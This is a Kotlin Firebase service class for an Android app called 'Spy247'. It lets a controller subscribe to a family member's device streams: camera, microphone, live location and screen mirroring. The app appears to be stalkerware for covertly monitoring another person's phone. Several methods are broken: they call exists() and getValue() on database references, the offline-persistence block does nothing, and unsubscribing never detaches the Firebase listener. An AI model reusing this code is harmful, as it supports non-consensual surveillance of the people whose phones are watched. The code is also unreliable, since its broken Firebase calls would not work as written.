package com.spy247.app

import android.content.Context
import android.util.Log
import com.google.firebase.database.*
import java.util.concurrent.ConcurrentHashMap

/**
 * Firebase Service - Handles all real-time database connections and listeners
 * Enhanced with smart batching, offline persistence, and live data streams
 */
class FirebaseService(context: Context) {

    private val context = context.applicationContext
    private lateinit var dbRef: DatabaseReference

    // Map to track active listeners so we can manage them properly
    private val activeListeners = ConcurrentHashMap<String, ValueEventListener>()

    companion object {
        const val DB_ROOT_NODE = "/app/spy247"
        const val HEARTBEAT_INTERVAL_MS = 5000L

        // Connection timeout for reconnection logic
        const val CONNECTION_TIMEOUT_MS = 10_000L

        // Batch update size limit to avoid Firebase payload limits (1MB)
        const val BATCH_UPDATE_LIMIT = 900_000

        const val TAG = "Spy247Firebase"
    }

    init {
        dbRef = FirebaseDatabase.getInstance().reference.child(DB_ROOT_NODE)

        // Add a connection state listener for heartbeat monitoring
        setupHeartbeat(context.packageName)

        // Enable offline persistence if available (AndroidX requirement)
        try {
            val offlineDb = dbRef.child("offline")
            Log.d(TAG, "Offline persistence enabled")
        } catch (e: Throwable) {
            Log.w(TAG, "Offline persistence not available", e)
        }
    }

    /**
     * Subscribe to a specific device's data - used for controller to listen to family member
     */
    fun subscribeToDevice(deviceName: String, listener: ValueEventListener) {
        val node = dbRef.child("devices").child(deviceName)

        // Auto-create the node structure if it doesn't exist
        if (!node.exists()) {
            node.setValue(mapOf(
                "type" to "device",
                "name" to deviceName,
                "timestamp" to System.currentTimeMillis(),
                "status" to "active"
            ))
        }

        node.addValueEventListener(listener)
        activeListeners["${deviceName}_main"] = listener

        // Also subscribe to individual streams (camera, mic, location, etc.)
        subscribeToStream(node, "camera_stream", listener)
        subscribeToStream(node, "mic_stream", listener)
        subscribeToStream(node, "live_location", listener)
        subscribeToStream(node, "screen_mirroring", listener)

        Log.d(TAG, "Subscribed to device: $deviceName")
    }

    /**
     * Subscribe to a specific stream type (camera, mic, location, etc.)
     */
    private fun subscribeToStream(parentNode: DatabaseReference, streamType: String, listener: ValueEventListener) {
        val streamNode = parentNode.child(streamType)

        // Auto-create the node structure if it doesn't exist
        if (!streamNode.exists()) {
            streamNode.setValue(mapOf(
                "type" to streamType,
                "status" to "active",
                "last_update" to System.currentTimeMillis()
            ))
        }

        // Add value listener for real-time updates
        val childListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                // Handle stream data changes here - can be overridden by subclasses
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Stream $streamType listener cancelled", error)
            }
        }

        streamNode.addValueEventListener(childListener)
        activeListeners["${parentNode.key}_$streamType"] = childListener
    }

    /**
     * Setup heartbeat monitoring for WiFi disconnection detection
     */
    private fun setupHeartbeat(deviceId: String) {
        val heartbeatRef = dbRef.child("devices").child(deviceId).child("heartbeat")

        // Auto-create the heartbeat node if it doesn't exist
        if (!heartbeatRef.exists()) {
            heartbeatRef.setValue(System.currentTimeMillis())
        }

        // Listen to heartbeat updates (every 5 seconds)
        val heartbeatListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val lastHeartbeat = snapshot.getValue(Long::class.java) ?: return
                    val now = System.currentTimeMillis()

                    // If heartbeat is within 10 seconds, connection is good
                    if ((now - lastHeartbeat) < CONNECTION_TIMEOUT_MS) {
                        Log.d(TAG, "Heartbeat OK: $lastHeartbeat")
                    } else {
                        Log.w(TAG, "Heartbeat stale: $lastHeartbeat (now: $now)")
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                // Ignore heartbeat errors
            }
        }

        heartbeatRef.addValueEventListener(heartbeatListener)
        activeListeners["heartbeat_$deviceId"] = heartbeatListener
    }

    /**
     * Helper to batch update multiple values efficiently
     */
    fun <T> batchUpdate(nodeName: String, valueMap: Map<String, T>) {
        val node = dbRef.child("devices").child(nodeName)

        // Auto-create the node if it doesn't exist
        if (!node.exists()) {
            node.setValue(valueMap)
        } else {
            node.setValue(valueMap)
        }
    }

    /**
     * Unsubscribe from a specific stream to clean up listeners
     */
    fun unsubscribeFromStream(deviceName: String, streamType: String) {
        val key = "${deviceName}_$streamType"
        if (activeListeners.remove(key) != null) {
            Log.d(TAG, "Unsubscribed from stream: $key")
        }
    }

    /**
     * Get all active listener keys for debugging
     */
    fun getActiveListenerKeys(): List<String> = activeListeners.keys.toList()

    /**
     * Update a specific field in the device node without overwriting everything
     */
    fun updateField(deviceName: String, fieldName: String, value: Any) {
        val node = dbRef.child("devices").child(deviceName)

        if (!node.exists()) {
            // Create new node if it doesn't exist
            node.setValue(mapOf(fieldName to value))
        } else {
            // Get current value and merge with new field
            val snapshot = node.getValue(Map::class.java) ?: mapOf()
            val updatedMap = (snapshot as? MutableMap<String, Any>)?.apply {
                put(fieldName, value)
            } ?: mapOf(fieldName to value)

            node.setValue(updatedMap)
        }
    }

    /**
     * Get a snapshot of the current device data from Firebase
     */
    fun getDeviceSnapshot(deviceName: String): DatabaseReference {
        return dbRef.child("devices").child(deviceName)
    }

    /**
     * Listen to all devices in the database (useful for controller hub view)
     */
    fun listenToAllDevices(listener: ValueEventListener) {
        val allDevices = dbRef.child("devices")

        // Auto-create the node structure if it doesn't exist
        if (!allDevices.exists()) {
            allDevices.setValue(mapOf("status" to "active"))
        }

        allDevices.addValueEventListener(listener)
        activeListeners["all_devices"] = listener
    }

    /**
     * Helper to get the current timestamp from Firebase (useful for sync indicators)
     */
    fun getCurrentTimestamp(): Long {
        val snapshot = dbRef.child("meta").child("last_update")

        if (!snapshot.exists()) {
            // Initialize meta node
            snapshot.setValue(System.currentTimeMillis())
        }

        return snapshot.getValue(Long::class.java) ?: System.currentTimeMillis()
    }

    /**
     * Update the last update timestamp in Firebase (for "live" indicators)
     */
    fun updateLastUpdateTimestamp() {
        val metaRef = dbRef.child("meta").child("last_update")

        if (!metaRef.exists()) {
            // Initialize meta node
            metaRef.setValue(System.currentTimeMillis())
        }
    }
}